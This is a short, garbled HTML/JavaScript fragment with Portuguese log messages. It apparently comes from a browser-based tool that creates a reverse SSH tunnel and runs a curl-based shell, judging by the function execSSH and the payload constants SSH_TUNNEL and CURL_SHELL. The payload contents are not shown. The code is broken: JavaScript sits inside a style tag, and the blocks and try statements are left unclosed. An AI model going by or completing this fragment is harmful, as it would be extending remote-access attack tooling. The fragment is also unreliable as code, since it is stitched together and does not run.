<!DOCTYPE html>

<style>

        logEl.scrollTop = logEl.scrollHeight;

    function execSSH() {
        log('[SSH] 🔗 Criando tunnel reverso...');

        try {
            let bytes = new Uint8Array(SSH_TUNNEL);

                log('[SSH] ✅ Tunnel criado!');

            setStatus('❌ Falha', 'error');

        try {
            let bytes = new Uint8Array(CURL_SHELL);

    // ================================================================

</script>
